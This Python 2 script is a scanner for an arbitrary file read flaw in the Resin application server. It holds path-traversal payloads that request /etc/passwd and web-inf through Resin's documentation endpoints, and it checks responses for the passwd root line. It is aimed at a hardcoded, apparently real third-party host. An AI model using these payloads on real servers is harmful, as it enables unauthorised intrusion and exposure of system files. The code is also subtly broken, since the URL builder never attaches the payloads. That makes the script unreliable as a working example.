#  -*- coding:utf-8 -*-

"""
    Resin远程任意文件读取漏洞
"""

import os
import sys
import urllib
import logging
import requests


#设置全局配置
reload(sys)
sys.setdefaultencoding('utf-8')


#定义全局变量和全局函数
payload1 = "/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd"
payload2 = "/resin-doc/examples/jndi-appconfig/test?inputFile=../../../../../../../../../../etc/passwd"
payload3 = "/ ..\\\\web-inf"
payloadList = [payload1,payload2,payload3]


def getUrl(url):
    urList = []
    if url != None and isinstance(url,str):
        if url.find(":") >= 3:
            for payload in payloadList:
                urList.append(url)
    else:
        pass
    return urList


class ResinScan:
    def __init__(self,url):
        self.tUrList = getUrl(url)
        self.flag = ["root:x:0:0:root:/root","<h1>Directory of"]
    def scan(self):
        for url in self.tUrList:
            print url
            try:
                response = requests.get(url,timeout=3,verify=False)
                for string in self.flag:
                    if response.content.find(string) >= 0:
                        return True
            except Exception,err:
                print(err)
        return False

if __name__ == "__main__":
    try:
        url = 'http://s69.pet.imop.com'
        scan = ResinScan(url)
        if scan.scan():
            print("[+] Any File Read Vul Find!")
        else:
            print("[-] Vul does not exist")
    except Exception,err:
        print(err)
        exit(0)